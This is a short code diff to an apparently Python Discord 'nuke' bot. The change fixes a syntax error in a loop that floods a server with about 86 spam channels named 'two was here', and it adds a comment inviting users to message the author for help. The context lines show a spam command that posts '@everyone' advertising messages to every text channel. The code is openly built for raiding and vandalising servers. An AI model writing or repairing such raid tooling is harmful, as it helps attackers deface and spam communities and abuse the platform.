@@ -38,7 +38,7 @@ async def nuke(ctx):
 
     n=0
     while(n<=85):
-        await guild.create_text_channel('two was here') ] #YOU MAY CHANGE SPAM CHANNELS NAME
+        await guild.create_text_channel('two was here') #YOU MAY CHANGE SPAM CHANNELS NAME
         n = n+1
 
     for c in ctx.guild.text_channels:
@@ -58,3 +58,5 @@ async def spam(ctx):
              await c.send('@everyone two#3082 was here join discord.gg/trends')
 
 client.run('YOUR TOKEN HERE') #DISCORD TOKEN IN BETWEEN THE '
+
+#IF THIS DOESNT WORK DM ME ON MY CORD two#3082
